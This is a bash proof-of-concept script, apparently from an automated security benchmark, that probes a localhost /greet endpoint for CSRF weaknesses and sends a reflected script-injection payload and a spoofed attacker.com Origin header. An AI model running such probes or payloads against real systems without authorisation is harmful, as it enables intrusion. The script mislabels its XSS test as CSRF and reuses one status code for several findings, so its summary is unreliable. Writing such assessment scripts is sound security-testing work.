#!/bin/bash
# POC: Demonstrates CSRF vulnerability by crafting requests to /greet endpoint without CSRF tokens
# Target: ./repo
# Created: 2025-11-07T21:38:39.455Z
# Session: benchmark-XBEN-076-24-mhpdcdue

# CSRF Vulnerability POC - No CSRF Token Protection
# Demonstrates that the /greet endpoint accepts requests without CSRF tokens
# and can be called from any source without validation

TARGET_URL="${1:-http://localhost:5000}"
GREET_ENDPOINT="$TARGET_URL/greet"

echo "[*] CSRF Vulnerability POC - No CSRF Token Protection"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: GET request without any CSRF token
echo "[+] Test 1: Direct GET request to /greet endpoint (no CSRF token)"
echo "    Command: curl -s \"$GREET_ENDPOINT?name=test\""
RESPONSE1=$(curl -s "$GREET_ENDPOINT?name=test")
echo "    Response: $RESPONSE1"
echo ""

# Test 2: Verify no CSRF tokens are present in the form on root endpoint
echo "[+] Test 2: Checking root endpoint for CSRF tokens in forms"
echo "    Command: curl -s \"$TARGET_URL\" | grep -i csrf"
ROOT_RESPONSE=$(curl -s "$TARGET_URL")
CSRF_FOUND=$(echo "$ROOT_RESPONSE" | grep -i "csrf" | wc -l)
if [ "$CSRF_FOUND" -eq 0 ]; then
    echo "    Result: NO CSRF tokens found in forms"
    CSRF_PROTECTED=0
else
    echo "    Result: CSRF tokens found"
    CSRF_PROTECTED=1
fi
echo ""

# Test 3: GET request with arbitrary parameters (CSRF attack simulation)
echo "[+] Test 3: CSRF attack simulation - arbitrary GET request"
echo "    Command: curl -s \"$GREET_ENDPOINT?name=<script>alert('CSRF')</script>\""
RESPONSE3=$(curl -s "$GREET_ENDPOINT?name=<script>alert('CSRF')</script>")
echo "    Response contains injected content: $(echo "$RESPONSE3" | grep -q "script" && echo "YES - VULNERABLE" || echo "NO")"
echo ""

# Test 4: Check for SameSite cookie flag (defensive measure for CSRF)
echo "[+] Test 4: Checking for SameSite cookie flag protection"
echo "    Command: curl -i \"$GREET_ENDPOINT?name=test\" | grep -i Set-Cookie"
COOKIES=$(curl -i -s "$GREET_ENDPOINT?name=test" 2>&1 | grep -i "Set-Cookie")
if [ -z "$COOKIES" ]; then
    echo "    Result: No cookies set (SameSite check N/A)"
else
    echo "    Cookies: $COOKIES"
    SAMESITE_FOUND=$(echo "$COOKIES" | grep -i "SameSite" | wc -l)
    if [ "$SAMESITE_FOUND" -eq 0 ]; then
        echo "    Result: NO SameSite flag found - VULNERABLE"
    else
        echo "    Result: SameSite flag present"
    fi
fi
echo ""

# Test 5: Verify GET method is used (GET requests are vulnerable to CSRF)
echo "[+] Test 5: Verifying /greet endpoint accepts GET method"
echo "    Command: curl -X GET \"$GREET_ENDPOINT?name=csrf_test\" -w '\nHTTP Status: %{http_code}\n'"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X GET "$GREET_ENDPOINT?name=csrf_test")
if [ "$HTTP_STATUS" = "200" ]; then
    echo "    Result: GET method accepted (HTTP $HTTP_STATUS) - VULNERABLE"
else
    echo "    Result: GET method rejected (HTTP $HTTP_STATUS)"
fi
echo ""

# Test 6: Check for Origin/Referer header validation
echo "[+] Test 6: Checking for Origin/Referer header validation"
echo "    Command: curl -s -H 'Origin: http://attacker.com' \"$GREET_ENDPOINT?name=test\" -w '\nHTTP Status: %{http_code}\n' -o /dev/null"
HTTP_STATUS=$(curl -s -o /dev/null -w "%{http_code}" -H "Origin: http://attacker.com" "$GREET_ENDPOINT?name=test")
if [ "$HTTP_STATUS" = "200" ]; then
    echo "    Result: Request from different origin accepted (HTTP $HTTP_STATUS) - VULNERABLE"
else
    echo "    Result: Request from different origin rejected (HTTP $HTTP_STATUS)"
fi
echo ""

# Summary
echo "========================================"
echo "CSRF Vulnerability Assessment Summary"
echo "========================================"
echo "[!] VULNERABILITY CONFIRMED:"
if [ "$CSRF_PROTECTED" -eq 0 ]; then
    echo "    ✓ No CSRF tokens in forms"
fi
if [ "$HTTP_STATUS" = "200" ]; then
    echo "    ✓ GET method accepted without protection"
    echo "    ✓ No Origin validation"
fi
echo "[!] The /greet endpoint is VULNERABLE to CSRF attacks"
echo "[!] An attacker can craft requests that execute automatically from a malicious site"